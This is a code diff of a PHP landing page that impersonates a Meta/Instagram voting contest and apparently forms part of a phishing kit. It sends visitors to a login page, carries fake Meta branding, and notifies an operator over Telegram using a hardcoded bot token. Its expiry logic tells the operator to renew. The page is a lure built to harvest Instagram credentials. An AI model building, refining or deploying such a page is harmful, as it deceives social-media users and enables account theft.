@@ -1,61 +1,42 @@
 <?php
 if (!file_exists('contestant_config.php') || time() - filemtime('contestant_config.php') > 300) {
-    include 'sync_config.php'; // auto-fetch if older than 5 min
+    include 'sync_config.php';
 }
 
-// Start the session first
 session_start();
 
-// Configuration files (should be moved to non-web-accessible directory)
-$configFiles = [
-    'time.txt',
-    'telegram_chat_id.txt',
-    'image_config.php',
-    'contestant_config.php'
-];
-
-// Check if configuration files exist
+$configFiles = ['time.txt', 'telegram_chat_id.txt', 'image_config.php', 'contestant_config.php'];
 foreach ($configFiles as $file) {
     if (!file_exists($file)) {
         die("Error: Configuration file '$file' not found.");
     }
 }
 
-//Redirect prevention logic
 if (!isset($_GET['t']) && !isset($_GET['r'])) {
     $originalUrl = '';
     $uniqueQueryString = 't=' . time();
-    
     $newUrl = strpos($originalUrl, '?') === false 
         ? $originalUrl . '?' . $uniqueQueryString 
         : $originalUrl . '&' . $uniqueQueryString;
-    
     header('Location: ' . $newUrl);
     exit();
 }
 
-// Load configurations
 $setDate = new DateTime(file_get_contents('time.txt'));
 $currentTime = new DateTime('now');
 $chatId = file_get_contents('telegram_chat_id.txt');
 $botToken = '8135112340:AAHvwvqU_0muChpkLfygH8SM47P9mdqFM8g';
 
-// Load image configuration
 $imageConfig = include('image_config.php');
 $mainImage = $imageConfig['main_image'];
 
-// Load contestant configuration
 $contestantsData = include('contestant_config.php');
 $mainContestant = $contestantsData['main_contestant'];
 $otherContestants = $contestantsData['contestants'];
 
-// Telegram message function
 function sendTelegramMessage($botToken, $chatId, $message) {
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-    ];
+    $data = ['chat_id' => $chatId, 'text' => $message];
     
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $url);
@@ -68,7 +49,6 @@ function sendTelegramMessage($botToken, $chatId, $message) {
     return $response;
 }
 
-// Check expiration
 if ($currentTime > $setDate) {
     ob_start();
     sendTelegramMessage($botToken, $chatId, "⏰ Page Expired\nLink: IG-VOTE\nStatus: Expired\nRENEW NOW!");
@@ -76,148 +56,17 @@ if ($currentTime > $setDate) {
     header('Location: 404');
     exit();
 }
-
-// // Send visitor message
-// sendTelegramMessage($botToken, $chatId, "👤 New Visitor\n// Link: IG-VOTE\n// Status: Active\n// Awaiting login...");
 ?>
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>The People's Pick: Online Voting Spectacle</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com/">
-    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <title>The People's Pick: Online Voting</title>
     <meta property="og:title" content="THE PEOPLE'S PICK">
     <meta property="og:description" content="Online voting spectacle.">
     <meta property="og:image" content="<?php echo $mainImage; ?>">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <script src="https://cdn.tailwindcss.com"></script>
-    <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-        }
-        
-        .glass-effect {
-            background: rgba(255, 255, 255, 0.25);
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.18);
-        }
-        
-        .translate-widget-container {
-            margin: 20px auto;
-            width: 90%;
-            max-width: 400px;
-            box-sizing: border-box;
-        }
-        
-        .custom-language-select {
-            width: 100%;
-            padding: 12px 16px;
-            font-size: 16px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-radius: 12px;
-            background: rgba(255, 255, 255, 0.9);
-            backdrop-filter: blur(10px);
-            appearance: none;
-            -webkit-appearance: none;
-            -moz-appearance: none;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
-        }
-        
-        .custom-language-select:focus {
-            outline: none;
-            border-color: #8b5cf6;
-            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
-        }
-        
-        .vote-card {
-            background: linear-gradient(145deg, #ffffff, #f8fafc);
-            border-radius: 24px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
-            overflow: hidden;
-            transition: all 0.3s ease;
-        }
-        
-        .vote-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
-        }
-        
-        .gradient-text {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        
-        .vote-button {
-            background: linear-gradient(135deg, #ff6b6b, #ee5a24, #ff9ff3, #54a0ff);
-            background-size: 300% 300%;
-            animation: gradientShift 3s ease infinite;
-            transition: all 0.3s ease;
-        }
-        
-        .vote-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 30px rgba(255, 107, 107, 0.4);
-        }
-        
-        @keyframes gradientShift {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        
-        .pulse-animation {
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.05); }
-        }
-        
-        .floating {
-            animation: floating 3s ease-in-out infinite;
-        }
-        
-        @keyframes floating {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-        }
-        
-        .sparkle {
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .sparkle::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transform: rotate(45deg);
-            animation: sparkle 2s linear infinite;
-        }
-        
-        @keyframes sparkle {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-        
-        @media (max-width: 600px) {
-            .custom-language-select {
-                font-size: 14px;
-                padding: 10px 12px;
-            }
-        }
-    </style>
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             const setDate = new Date("<?php echo $setDate->format('Y-m-d H:i:s'); ?>");
@@ -229,216 +78,45 @@ if ($currentTime > $setDate) {
         });
     </script>
 </head>
-<body class="font-poppins">
-    <!-- Language Selector -->
-    <div class="translate-widget-container floating">
-        <select id="custom-language-select" class="custom-language-select">
-            <option value="">🌍 Select Language</option>
-            <option value="en|af">Afrikaans</option>
-            <option value="en|sq">Albanian</option>
-            <option value="en|am">Amharic</option>
-            <option value="en|ar">Arabic</option>
-            <option value="en|hy">Armenian</option>
-            <option value="en|az">Azerbaijani</option>
-            <option value="en|eu">Basque</option>
-            <option value="en|be">Belarusian</option>
-            <option value="en|bn">Bengali</option>
-            <option value="en|bs">Bosnian</option>
-            <option value="en|bg">Bulgarian</option>
-            <option value="en|ca">Catalan</option>
-            <option value="en|ceb">Cebuano</option>
-            <option value="en|ny">Chichewa</option>
-            <option value="en|zh-CN">Chinese (Simplified)</option>
-            <option value="en|zh-TW">Chinese (Traditional)</option>
-            <option value="en|co">Corsican</option>
-            <option value="en|hr">Croatian</option>
-            <option value="en|cs">Czech</option>
-            <option value="en|da">Danish</option>
-            <option value="en|nl">Dutch</option>
-            <option value="en|en">English</option>
-            <option value="en|eo">Esperanto</option>
-            <option value="en|et">Estonian</option>
-            <option value="en|tl">Filipino</option>
-            <option value="en|fi">Finnish</option>
-            <option value="en|fr">French</option>
-            <option value="en|fy">Frisian</option>
-            <option value="en|gl">Galician</option>
-            <option value="en|ka">Georgian</option>
-            <option value="en|de">German</option>
-            <option value="en|el">Greek</option>
-            <option value="en|gu">Gujarati</option>
-            <option value="en|ht">Haitian Creole</option>
-            <option value="en|ha">Hausa</option>
-            <option value="en|haw">Hawaiian</option>
-            <option value="en|iw">Hebrew</option>
-            <option value="en|hi">Hindi</option>
-            <option value="en|hmn">Hmong</option>
-            <option value="en|hu">Hungarian</option>
-            <option value="en|is">Icelandic</option>
-            <option value="en|ig">Igbo</option>
-            <option value="en|id">Indonesian</option>
-            <option value="en|ga">Irish</option>
-            <option value="en|it">Italian</option>
-            <option value="en|ja">Japanese</option>
-            <option value="en|jw">Javanese</option>
-            <option value="en|kn">Kannada</option>
-            <option value="en|kk">Kazakh</option>
-            <option value="en|km">Khmer</option>
-            <option value="en|ko">Korean</option>
-            <option value="en|ku">Kurdish (Kurmanji)</option>
-            <option value="en|ky">Kyrgyz</option>
-            <option value="en|lo">Lao</option>
-            <option value="en|la">Latin</option>
-            <option value="en|lv">Latvian</option>
-            <option value="en|lt">Lithuanian</option>
-            <option value="en|lb">Luxembourgish</option>
-            <option value="en|mk">Macedonian</option>
-            <option value="en|mg">Malagasy</option>
-            <option value="en|ms">Malay</option>
-            <option value="en|ml">Malayalam</option>
-            <option value="en|mt">Maltese</option>
-            <option value="en|mi">Maori</option>
-            <option value="en|mr">Marathi</option>
-            <option value="en|mn">Mongolian</option>
-            <option value="en|my">Myanmar (Burmese)</option>
-            <option value="en|ne">Nepali</option>
-            <option value="en|no">Norwegian</option>
-            <option value="en|ps">Pashto</option>
-            <option value="en|fa">Persian</option>
-            <option value="en|pl">Polish</option>
-            <option value="en|pt">Portuguese</option>
-            <option value="en|pa">Punjabi</option>
-            <option value="en|ro">Romanian</option>
-            <option value="en|ru">Russian</option>
-            <option value="en|sm">Samoan</option>
-            <option value="en|gd">Scots Gaelic</option>
-            <option value="en|sr">Serbian</option>
-            <option value="en|st">Sesotho</option>
-            <option value="en|sn">Shona</option>
-            <option value="en|sd">Sindhi</option>
-            <option value="en|si">Sinhala</option>
-            <option value="en|sk">Slovak</option>
-            <option value="en|sl">Slovenian</option>
-            <option value="en|so">Somali</option>
-            <option value="en|es">Spanish</option>
-            <option value="en|su">Sundanese</option>
-            <option value="en|sw">Swahili</option>
-            <option value="en|sv">Swedish</option>
-            <option value="en|tg">Tajik</option>
-            <option value="en|ta">Tamil</option>
-            <option value="en|te">Telugu</option>
-            <option value="en|th">Thai</option>
-            <option value="en|tr">Turkish</option>
-            <option value="en|uk">Ukrainian</option>
-            <option value="enur">Urdu</option>
-            <option value="en|uz">Uzbek</option>
-            <option value="en|vi">Vietnamese</option>
-            <option value="en|cy">Welsh</option>
-            <option value="en|xh">Xhosa</option>
-        </select>
-    </div>
-    
-    <div id="google_translate_element" style="display:none;"></div>
-    
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            var customSelect = document.getElementById("custom-language-select");
-            customSelect.addEventListener("change", function() {
-                var langPair = this.value;
-                doGTranslate(langPair);
-            });
-        });
+<body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
+    <div class="max-w-md w-full bg-white rounded-2xl shadow-xl overflow-hidden">
+        <!-- Main Image -->
+        <div class="relative">
+            <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-64 object-cover">
+            <div class="absolute inset-0 bg-gradient-to-t from-black/50 to-transparent"></div>
+            <h1 class="absolute bottom-4 left-4 text-white text-2xl font-bold">THE PEOPLE'S PICK</h1>
+        </div>
         
-        function doGTranslate(langPair) {
-            if (!langPair) return;
-            var lang = langPair.split('|')[1];
-            var gtCombo = document.querySelector('.goog-te-combo');
-            if (gtCombo) {
-                gtCombo.value = lang;
-                var event = document.createEvent("HTMLEvents");
-                event.initEvent("change", true, true);
-                gtCombo.dispatchEvent(event);
-            }
-        }
-    </script>
-    
-    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-    
-    <script>
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({
-                pageLanguage: 'en',
-                autoDisplay: false
-            }, 'google_translate_element');
-            
-            setTimeout(function() {
-                var userLang = navigator.language || navigator.userLanguage;
-                if (userLang && userLang.toLowerCase().indexOf('en') !== 0) {
-                    doGTranslate('en|' + userLang);
-                    var selectEl = document.getElementById("custom-language-select");
-                    if (selectEl) {
-                        selectEl.value = 'en|' + userLang;
-                    }
-                }
-            }, 1000);
-        }
-    </script>
-
-    <div class="container mx-auto px-4 py-8">
-        <div class="vote-card mb-8">
-            <div class="relative sparkle">
-                <img src="<?php echo $mainImage; ?>" alt="Main Image" class="w-full h-64 object-cover">
-                <div class="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent"></div>
-                <div class="absolute bottom-0 left-0 right-0 p-6">
-                    <h1 class="text-white text-4xl font-bold mb-2 pulse-animation">🏆 THE PEOPLE'S PICK</h1>
-                    <p class="text-white/90 text-lg">✨ Your vote matters! Make it count! ✨</p>
+        <!-- Content -->
+        <div class="p-6">
+            <!-- Contestant Info -->
+            <div class="flex items-center mb-4">
+                <div class="w-12 h-12 bg-blue-500 rounded-full flex items-center justify-center">
+                    <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 20 20">
+                        <path fill-rule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path>
+                    </svg>
+                </div>
+                <div class="ml-3">
+                    <h2 class="text-lg font-semibold text-gray-900"><?php echo htmlspecialchars($mainContestant['name']); ?></h2>
+                    <p class="text-sm text-gray-500"><?php echo htmlspecialchars($mainContestant['votes']); ?> votes • #<?php echo htmlspecialchars($mainContestant['position']); ?></p>
                 </div>
             </div>
             
-            <div class="p-8">
-                <div class="flex items-center mb-6">
-                    <div class="relative">
-                        <img src="https://i.postimg.cc/T1h8T8Jj/instagram-verified-tick-kxkwzn.png" alt="Verified Badge" class="w-16 h-16 rounded-full object-cover border-4 border-white shadow-lg pulse-animation">
-                        <div class="absolute -top-1 -right-1 w-6 h-6 bg-green-500 rounded-full border-2 border-white"></div>
-                    </div>
-                    <div class="ml-6">
-                        <h2 class="text-2xl font-bold gradient-text"><?php echo htmlspecialchars($mainContestant['name']); ?> ●</h2>
-                        <div class="flex items-center gap-2 mt-1">
-                            <span class="bg-gradient-to-r from-purple-500 to-pink-500 text-white px-3 py-1 rounded-full text-sm font-semibold">
-                                🗳️ <?php echo htmlspecialchars($mainContestant['votes']); ?> votes
-                            </span>
-                            <span class="bg-gradient-to-r from-blue-500 to-cyan-500 text-white px-3 py-1 rounded-full text-sm font-semibold">
-                                🏅 Position <?php echo htmlspecialchars($mainContestant['position']); ?>
-                            </span>
-                        </div>
-                    </div>
-                </div>
-                
-                <div class="bg-gradient-to-r from-blue-50 to-purple-50 p-6 rounded-2xl mb-8 border border-purple-100">
-                    <p class="text-gray-700 text-lg leading-relaxed">
-                        🚀 <strong>I need your support!</strong> Please take a moment to cast your vote and help me reach new heights in this competition. Your vote could be the difference-maker, propelling me toward victory! 🌟
-                    </p>
-                </div>
-                
-                <div class="flex flex-col md:flex-row gap-6">
-                    <a href="login.php" class="vote-button flex items-center justify-center gap-3 text-white py-4 px-8 rounded-2xl font-bold text-lg shadow-lg">
-                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="currentColor" viewBox="0 0 16 16">
-                            <path d="M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z"/>
-                        </svg>
-                        🎯 Vote on Instagram
-                    </a>
-                </div>
-            </div>
+            <!-- Message -->
+            <p class="text-gray-600 text-sm mb-6 leading-relaxed">
+                I need your support! Please vote and help me reach new heights in this competition.
+            </p>
+            
+            <!-- Vote Button -->
+            <a href="login.php" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white py-3 px-4 rounded-xl font-medium text-center block hover:from-pink-600 hover:to-purple-700 transition-all duration-200 shadow-lg">
+                🗳️ Vote Now
+            </a>
         </div>
     </div>
     
-   
-   
-    
-    <footer class="bg-white mt-12 py-6">
-        <div class="container mx-auto px-4 text-center text-gray-600">
-            <p>© 2025. By Meta.</p>
-        </div>
-    </footer>
+    <!-- Footer -->
+    <div class="fixed bottom-4 left-1/2 transform -translate-x-1/2">
+        <p class="text-xs text-gray-400">© 2025 Meta</p>
+    </div>
 </body>
 </html>
